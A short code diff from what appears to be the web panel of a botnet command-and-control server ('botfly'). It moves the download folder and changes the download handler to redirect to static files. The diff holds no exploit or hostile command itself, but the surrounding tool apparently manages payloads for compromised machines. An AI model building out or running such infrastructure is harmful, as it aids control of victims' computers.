@@ -30,7 +30,7 @@ eventlet.monkey_patch()
 HOSTNAME = 'botfly'
 BASEDIR = os.path.abspath(os.path.dirname(__file__))
 UPLOAD_FOLDER = 'payloads/'
-DOWNLOAD_FOLDER = 'media/downloads/'
+DOWNLOAD_FOLDER = 'static/downloads/'
 
 # Set this variable to "threading", "eventlet" or "gevent" to test the
 # different async modes, or leave it set to None for the application to choose
@@ -262,7 +262,10 @@ def download_file():
             filename = request.args.get('file')
 
             real_filename = botnet.getFileName(user, filename)
-            if real_filename:
+            if real_filename and DOWNLOAD_FOLDER in real_filename:
+                sub_filename = real_filename[real_filename.index('static/')+len('static/'):]
+                return flask.redirect(flask.url_for('static',filename=sub_filename))
+            elif real_filename:
                 return flask.send_file(real_filename, attachment_filename=os.path.basename(filename))
             else:
                 return "File not found", 404
